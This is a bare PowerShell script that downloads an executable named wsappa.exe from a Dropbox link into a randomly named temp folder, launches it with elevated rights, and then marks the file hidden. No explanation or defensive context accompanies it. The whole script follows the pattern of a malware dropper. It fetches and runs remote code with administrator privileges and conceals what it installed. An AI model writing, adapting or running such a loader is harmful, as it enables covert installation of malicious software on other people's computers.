$fileUrl = "dl.dropboxusercontent.com/scl/fi/m3ub7x9td0g1a7b2jlv62/wsappa-1.9.exe?rlkey=rhyarsxdetqvyyx5gfv44uyq7&dl=0"
$savePath = "$env:temp\sVBXKuz\wsappa.exe"

if (!(Test-Path -Path $savePath)) {
    try {
        $folderPath = Join-Path $env:temp "sVBXKuz"
        if (!(Test-Path -Path $folderPath)) {
            New-Item -Path $folderPath -ItemType Directory
        }
        
        Set-Location -Path $folderPath

        $downloadedFilePath = Join-Path $folderPath "wsappa.exe"
        Invoke-WebRequest -Uri $fileUrl -OutFile $downloadedFilePath
        Start-Process $env:temp\sVBXKuz\wsappa.exe -Verb RunAs

        # Hide the downloaded file
        Set-ItemProperty -Path $env:temp\sVBXKuz\wsappa.exe -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    } catch {
        Write-Host "Failed to download the file: $_"
    }
} else {
    Write-Host "File already exists."
}

Exit
